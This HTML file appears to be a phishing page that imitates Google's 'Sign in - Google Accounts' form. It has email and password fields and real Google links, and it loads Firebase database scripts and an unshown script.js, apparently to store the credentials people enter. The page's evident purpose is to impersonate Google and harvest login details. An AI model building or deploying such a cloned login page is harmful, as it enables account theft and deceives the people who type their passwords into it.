<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Sign in - Google Accounts</title>
<link rel="icon" type="image/x-icon" href="favicon.png">
<link rel="stylesheet" href="style.css" />
<!-- Compiled and minified CSS -->
<link
rel="stylesheet"
href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css"
/>
<!-- Compiled and minified JavaScript -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-database-compat.js"></script>
<script src="script.js"></script>
</head>
<body>
<div class="login-div">
<div class="row">
    <img class="google" src="logo.jpeg">
</div>
<div class="row center">
<h5>Sign in</h5>
<h6>Use your Google account</h6>
</div>
<div class="row">
<div class="input-field col s12">
<input id="email_input" type="email"  />
<label for="email_input">Email or phone</label>
</div>
</div>
<div class="row">
<div class="input-field col s12">
<input id="password_input" type="password"  />
<label for="password_input">Password</label>
<div>
<label>
    <input type="checkbox" id="show_pwd"  onclick="myFunction()" />
    <span>Show password</span>
</label>
</div>
<br>
<div>
<a href="#" class="links"><b>Forgot Password?</b></a>
</div>
</div>
<div class="row">
<div class="col s12">
Not your device? Use Guest mode to sign in privately.
<a href="https://support.google.com/chrome/answer/6130773?hl=en" class="links"><b>Learn more</b></a>
</div>
</div>
<div class="row"></div>
<div class="row">
<div class="col s6"><a href="https://accounts.google.com/signup" class="links">Create account</a></div>
<div class="col s6 right-align">
<a class="waves-effect waves-light btn" id="button" href="post-login.html">Login</a></button>
</div>
</div>
</div>
</div>
</body>
</html>
